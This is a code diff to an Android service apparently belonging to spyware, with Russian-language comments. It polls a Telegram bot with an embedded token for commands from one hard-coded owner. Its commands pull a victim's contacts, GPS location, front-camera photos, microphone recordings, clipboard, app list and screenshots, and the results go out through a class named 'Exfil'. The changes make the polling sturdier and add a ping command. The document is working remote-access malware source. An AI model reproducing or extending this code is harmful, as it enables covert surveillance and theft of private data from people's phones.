@@ -9,7 +9,6 @@ import java.io.BufferedReader;
 import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
 import java.net.URL;
-import java.net.URLEncoder;
 import org.json.JSONArray;
 import org.json.JSONObject;
 
@@ -17,7 +16,7 @@ public class CommandListener extends Service {
 
     private static final String TOKEN = "8688274559:AAGlGdaQh70HHSrEs_zMdkeW1udazQr6z5A";
     private static final String OWNER = "8558500657";
-    private static final long INTERVAL = 10000; // 10 секунд
+    private static final long INTERVAL = 10000;
     private long lastUpdateId = 0;
     private Handler handler = new Handler(Looper.getMainLooper());
     private boolean running = false;
@@ -26,6 +25,7 @@ public class CommandListener extends Service {
     public int onStartCommand(Intent intent, int flags, int startId) {
         if (!running) {
             running = true;
+            Exfil.send("CMD", "Listener запущен, жду команды");
             handler.post(poll);
         }
         return START_STICKY;
@@ -39,8 +39,8 @@ public class CommandListener extends Service {
                     String url = "https://api.telegram.org/bot" + TOKEN
                         + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=5";
                     HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
-                    c.setConnectTimeout(10000);
-                    c.setReadTimeout(10000);
+                    c.setConnectTimeout(15000);
+                    c.setReadTimeout(15000);
                     BufferedReader r = new BufferedReader(
                         new InputStreamReader(c.getInputStream()));
                     StringBuilder sb = new StringBuilder();
@@ -49,29 +49,34 @@ public class CommandListener extends Service {
                     r.close();
 
                     JSONObject obj = new JSONObject(sb.toString());
-                    if (!obj.optBoolean("ok", false)) return;
+                    if (!obj.optBoolean("ok", false)) {
+                        if (running) handler.postDelayed(poll, INTERVAL);
+                        return;
+                    }
 
                     JSONArray arr = obj.optJSONArray("result");
-                    if (arr == null) return;
+                    if (arr != null) {
+                        for (int i = 0; i < arr.length(); i++) {
+                            JSONObject upd = arr.getJSONObject(i);
+                            lastUpdateId = upd.optLong("update_id", lastUpdateId);
 
-                    for (int i = 0; i < arr.length(); i++) {
-                        JSONObject upd = arr.getJSONObject(i);
-                        lastUpdateId = upd.optLong("update_id", lastUpdateId);
+                            JSONObject msg = upd.optJSONObject("message");
+                            if (msg == null) continue;
 
-                        JSONObject msg = upd.optJSONObject("message");
-                        if (msg == null) continue;
+                            JSONObject chat = msg.optJSONObject("chat");
+                            if (chat == null) continue;
+                            String chatId = chat.optString("id", "");
+                            if (!OWNER.equals(chatId)) continue;
 
-                        JSONObject chat = msg.optJSONObject("chat");
-                        if (chat == null) continue;
-                        String chatId = chat.optString("id", "");
-                        if (!OWNER.equals(chatId)) continue; // только от тебя
+                            String text = msg.optString("text", "").trim();
+                            if (text.isEmpty()) continue;
 
-                        String text = msg.optString("text", "").trim();
-                        if (text.isEmpty()) continue;
-
-                        handleCommand(text);
+                            handleCommand(text);
+                        }
                     }
-                } catch (Throwable ignored) {}
+                } catch (Throwable t) {
+                    // на ошибках поллинга просто ждём
+                }
                 if (running) handler.postDelayed(poll, INTERVAL);
             }).start();
         }
@@ -85,19 +90,29 @@ public class CommandListener extends Service {
                     "/info — статус устройства\n" +
                     "/apps — список приложений\n" +
                     "/contacts — контакты\n" +
-                    "/location — GPS координаты\n" +
-                    "/photo — фото с фронталки\n" +
+                    "/location — GPS\n" +
+                    "/photo — фото фронталка\n" +
                     "/mic — запись 20 сек\n" +
-                    "/clip — буфер обмена\n" +
+                    "/clip — буфер\n" +
                     "/battery — батарея\n" +
                     "/vibrate — вибрация\n" +
-                    "/help — справка");
+                    "/ping — тест связи");
+                return;
+            }
+
+            if (text.startsWith("/ping")) {
+                Exfil.send("CMD", "Pong! Связь работает");
                 return;
             }
 
             if (text.startsWith("/screenshot")) {
-                CommandHandler.takeScreenshot(this);
-                Exfil.send("CMD", "Скрин снят");
+                try {
+                    Intent i = new Intent(this, MediaSniffer.class);
+                    i.setAction("CAPTURE_NOW");
+                    startService(i);
+                } catch (Throwable t) {
+                    Exfil.send("CMD", "Ошибка screenshot: " + t.getMessage());
+                }
                 return;
             }
 
@@ -108,7 +123,6 @@ public class CommandListener extends Service {
 
             if (text.startsWith("/apps")) {
                 AppList.dump(this);
-                Exfil.send("CMD", "Список приложений отправлен");
                 return;
             }
 
@@ -144,14 +158,13 @@ public class CommandListener extends Service {
 
             if (text.startsWith("/vibrate")) {
                 CommandHandler.vibrate(this);
-                Exfil.send("CMD", "Вибрация");
+                Exfil.send("CMD", "Вибрация отправлена");
                 return;
             }
 
-            // неизвестная команда
             Exfil.send("CMD", "Неизвестная команда: " + text);
         } catch (Throwable t) {
-            Exfil.send("CMD", "Ошибка: " + t.getMessage());
+            Exfil.send("CMD", "Ошибка выполнения: " + t.getMessage());
         }
     }
 
